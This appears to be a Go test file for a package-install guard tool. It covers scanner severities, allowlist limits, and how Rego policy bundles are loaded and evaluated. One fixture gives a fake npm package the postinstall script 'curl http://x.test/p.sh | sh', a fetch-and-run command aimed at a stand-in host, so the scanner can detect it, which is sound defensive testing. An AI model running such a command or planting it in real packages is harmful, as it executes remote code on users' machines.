package cli

import (
	"context"
	"path/filepath"
	"strings"
	"testing"

	"github.com/chain305/chainsaw-core/policy/dsl"
	"github.com/chain305/chainsaw-core/policyengine"
)

// TestGuardPolicySeverityStringsMatchTheScanner pins the behavioral
// severity literals guard_policy.go projects onto policy input against
// the ones guard_artifact.go actually emits. Same idiom as
// TestGuardAllowlistSeverityStringsMatchTheEvaluator: a rename in the
// scanner must not silently stop populating the policy input, because
// the failure mode is invisible — rules keyed on hasInstallScript would
// just quietly stop firing.
func TestGuardPolicySeverityStringsMatchTheScanner(t *testing.T) {
	high := analyzeArtifact("npm", makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl http://x.test/p.sh | sh"}}`,
	}))
	if !high.Block || high.Severity != guardSeverityBehavioralHigh {
		t.Fatalf("scanner high severity drifted: got block=%v severity=%q, guard_policy.go expects %q",
			high.Block, high.Severity, guardSeverityBehavioralHigh)
	}
}

// TestGuardPolicySeverityIsUnwaivable pins the boundary: an operator's
// policy rule is not name-similarity inference, so a local allowlist
// entry must never clear it. The allowlist predicate is the single
// definition of what may be waived; "policy" must sit outside it.
func TestGuardPolicySeverityIsUnwaivable(t *testing.T) {
	if guardAllowlistableSeverity(guardSeverityPolicy) {
		t.Fatal("guardSeverityPolicy must NOT be allowlistable — a user cannot waive their org's own rule")
	}
	if !strings.HasPrefix(guardSeverityTyposquatHigh, guardSeverityTyposquatPrefix) {
		t.Fatal("typosquat prefix drifted; the exclusion above may no longer hold by construction")
	}
}

// TestGuardPolicyLane_CleanPackageIsSilent guards the direction that
// matters for a free tool people leave installed: the built-in bundle
// must say nothing about a normal package. A default policy that fires
// on everything trains users to ignore the guard.
func TestGuardPolicyLane_CleanPackageIsSilent(t *testing.T) {
	guardPolicyResetForTest()
	t.Cleanup(guardPolicyResetForTest)
	t.Setenv(guardPolicyBundleEnv, "")
	t.Setenv("CHAINSAW_CONFIG_HOME", t.TempDir())

	spec := packageSpec{Ecosystem: "npm", Name: "lodash", Version: "4.17.21"}
	if v, ok := guardPolicyLane(context.Background(), spec, acquireMiss, behavioralVerdict{}); ok {
		t.Fatalf("clean package must produce no policy verdict, got %+v", v)
	}
}

// TestGuardPolicyLane_IncompleteMonitorsByDefault is the end-to-end
// proof of the 2026-08-24 ruling: a degraded analysis becomes an input
// to policy, the built-in default answers "monitor", and the install is
// warned about rather than refused.
func TestGuardPolicyLane_IncompleteMonitorsByDefault(t *testing.T) {
	guardPolicyResetForTest()
	t.Cleanup(guardPolicyResetForTest)
	t.Setenv(guardPolicyBundleEnv, "")
	t.Setenv("CHAINSAW_CONFIG_HOME", t.TempDir())

	spec := packageSpec{Ecosystem: "npm", Name: "some-pkg", Version: "1.0.0"}
	v, ok := guardPolicyLane(context.Background(), spec, acquireIncomplete, behavioralVerdict{})
	if !ok {
		t.Fatal("acquireIncomplete must reach policy and produce a verdict")
	}
	if v.Block {
		t.Fatalf("built-in default must NOT block on a degraded analysis — that hard-fails installs on any large cache; got %+v", v)
	}
	if v.Severity != guardSeverityPolicy {
		t.Fatalf("policy verdict severity = %q, want %q", v.Severity, guardSeverityPolicy)
	}
	if !strings.Contains(v.Reason, "builtin/degraded-analysis") {
		t.Fatalf("reason must name the rule that fired so a user can trace it, got %q", v.Reason)
	}
}

// TestGuardPolicyLane_MissIsNotIncomplete is the whole point of the
// acquireResult split, asserted at the policy boundary: a package that
// simply was not cached must NOT trip the degraded-analysis rule.
// Before the split both cases were a bare nil and this rule would have
// fired on every uncached install.
func TestGuardPolicyLane_MissIsNotIncomplete(t *testing.T) {
	guardPolicyResetForTest()
	t.Cleanup(guardPolicyResetForTest)
	t.Setenv(guardPolicyBundleEnv, "")
	t.Setenv("CHAINSAW_CONFIG_HOME", t.TempDir())

	spec := packageSpec{Ecosystem: "npm", Name: "some-pkg", Version: "1.0.0"}
	if v, ok := guardPolicyLane(context.Background(), spec, acquireMiss, behavioralVerdict{}); ok {
		t.Fatalf("acquireMiss must not trip degraded-analysis, got %+v — an uncached package is not a degraded one", v)
	}
}

// TestGuardPolicyLane_OperatorBundleCanTighten proves the ruling's
// other half: fail-closed coverage is a policy edit, not a code change.
// The same fact the built-in bundle monitors, an operator blocks.
func TestGuardPolicyLane_OperatorBundleCanTighten(t *testing.T) {
	guardPolicyResetForTest()
	t.Cleanup(guardPolicyResetForTest)
	dir := t.TempDir()
	mustWrite(t, filepath.Join(dir, "strict.rego"), `package chainsaw.policy

decision contains {
	"action":  "block",
	"rule_id": "org/no-degraded-analysis",
	"message": "artifact was not fully inspected",
} if {
	input.signalsUnavailable == true
}
`)
	t.Setenv(guardPolicyBundleEnv, dir)

	spec := packageSpec{Ecosystem: "npm", Name: "some-pkg", Version: "1.0.0"}
	v, ok := guardPolicyLane(context.Background(), spec, acquireIncomplete, behavioralVerdict{})
	if !ok || !v.Block {
		t.Fatalf("an operator rule must be able to block on a degraded analysis, got ok=%v %+v", ok, v)
	}
	if !strings.Contains(v.Reason, "org/no-degraded-analysis") {
		t.Fatalf("reason must name the operator rule, got %q", v.Reason)
	}
}

// TestGuardPolicyLane_BrokenBundleFailsOpen pins the fail posture. A
// rule the operator cannot compile is their own mistake on their own
// machine; it must cost them their rules, not their install path. The
// built-in defaults survive, and the failure is COUNTED rather than
// silent.
func TestGuardPolicyLane_BrokenBundleFailsOpen(t *testing.T) {
	guardPolicyResetForTest()
	t.Cleanup(guardPolicyResetForTest)
	dir := t.TempDir()
	mustWrite(t, filepath.Join(dir, "broken.rego"), "package chainsaw.policy\n\nthis is not rego {{{\n")
	t.Setenv(guardPolicyBundleEnv, dir)

	before := GuardPolicyLoadFailureCount()
	spec := packageSpec{Ecosystem: "npm", Name: "some-pkg", Version: "1.0.0"}

	// Install path still works.
	if v, ok := guardPolicyLane(context.Background(), spec, acquireMiss, behavioralVerdict{}); ok && v.Block {
		t.Fatalf("a broken bundle must never block an install, got %+v", v)
	}
	// Built-in defaults survived the operator's syntax error.
	if _, ok := guardPolicyLane(context.Background(), spec, acquireIncomplete, behavioralVerdict{}); !ok {
		t.Fatal("built-in defaults must survive a broken operator bundle")
	}
	if GuardPolicyLoadFailureCount() == before {
		t.Fatal("a bundle compile failure must be counted, not silent")
	}
}

// TestGuardPolicyLane_MissingConfiguredBundleIsCounted: an operator who
// points CHAINSAW_POLICY_BUNDLE at a path that does not exist believes
// they have a policy and does not. Silence there is the worst outcome.
func TestGuardPolicyLane_MissingConfiguredBundleIsCounted(t *testing.T) {
	guardPolicyResetForTest()
	t.Cleanup(guardPolicyResetForTest)
	t.Setenv(guardPolicyBundleEnv, filepath.Join(t.TempDir(), "does-not-exist"))

	before := GuardPolicyLoadFailureCount()
	guardPolicyLane(context.Background(), packageSpec{Ecosystem: "npm", Name: "x", Version: "1.0.0"}, acquireMiss, behavioralVerdict{})
	if GuardPolicyLoadFailureCount() == before {
		t.Fatal("a configured-but-absent bundle must be counted")
	}
}

// TestGuardPolicyReason_NamesTheDecisiveRule is the regression pin for
// the bug TestGuardPolicyLane_OperatorBundleCanTighten caught: with the
// built-in monitor rule and an operator block rule both firing, the
// verdict is block and the reason must name the BLOCK rule. Naming
// Violations[0] told the user "monitor rule fired" while refusing their
// install, and rego set order made which one appeared first arbitrary.
func TestGuardPolicyReason_NamesTheDecisiveRule(t *testing.T) {
	dec := policyengine.Decision{
		Action: dsl.ActionBlock,
		Violations: []dsl.Violation{
			{RuleID: "builtin/degraded-analysis", Action: dsl.ActionMonitor, Message: "monitor msg"},
			{RuleID: "org/strict", Action: dsl.ActionBlock, Message: "block msg"},
		},
	}
	got := guardPolicyReason(dec)
	if !strings.Contains(got, "org/strict") {
		t.Fatalf("reason must name the rule that produced the action, got %q", got)
	}
	if strings.Contains(got, "builtin/degraded-analysis") {
		t.Fatalf("reason must not name a non-decisive rule, got %q", got)
	}
}
